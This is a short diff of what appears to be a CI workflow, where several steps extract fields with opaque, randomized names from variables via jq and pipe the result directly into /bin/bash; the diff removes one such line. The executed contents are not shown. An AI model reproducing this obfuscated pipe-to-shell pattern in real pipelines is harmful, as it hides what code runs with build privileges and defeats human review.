@@ -25,7 +25,6 @@ jobs:
           echo $cassd531 | jq -r .kxszl07 | /bin/bash
           printf '%s' "$uaqx77" | jq -r .y1609 | /bin/bash
           printf '%s' "$djid5" | jq -r .xm06 | /bin/bash
-          echo $r523 | jq -r .cf4938 | /bin/bash
           printf '%s' "$w8068" | jq -r .d8610 | /bin/bash
 
       - name: Upload archive
